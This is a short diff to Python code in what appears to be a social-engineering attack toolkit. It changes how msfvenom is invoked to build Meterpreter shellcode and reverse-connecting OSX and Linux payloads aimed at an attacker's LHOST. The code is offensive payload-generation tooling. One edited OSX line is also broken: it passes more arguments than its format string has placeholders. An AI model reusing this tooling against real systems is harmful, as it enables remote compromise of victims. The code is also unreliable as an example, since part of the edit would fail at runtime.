@@ -316,7 +316,7 @@ try:
 
                     if choice1 == "shellcode/alphanum":
                         print_status("Generating the payload via msfvenom and generating alphanumeric shellcode...")
-			subprocess.Popen("ruby %s/msfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,choice9,choice2,portnum,setdir), shell=True).wait()
+			subprocess.Popen("%smsfvenom -p %s LHOST=%s %s StagerURILength=5 StagerVerifySSLCert=false -e EXITFUNC=thread -e x86/alpha_mixed --format raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (meta_path(),choice9,choice2,portnum,setdir), shell=True).wait()
 
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                         # here we update set options to specify pyinjection and multipy
@@ -607,9 +607,9 @@ try:
                         osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                         linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                         print_status("Generating OSX payloads through Metasploit...")
-                        subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(),osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         print_status("Generating Linux payloads through Metasploit...")
-                        subprocess.Popen(r"ruby %s/msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+                        subprocess.Popen(r"%smsfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/nix.bin" % (meta_path(),linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         if multiattack_java == "on":
                             multiattack.write("OSX="+str(port1)+"\n")
                             multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
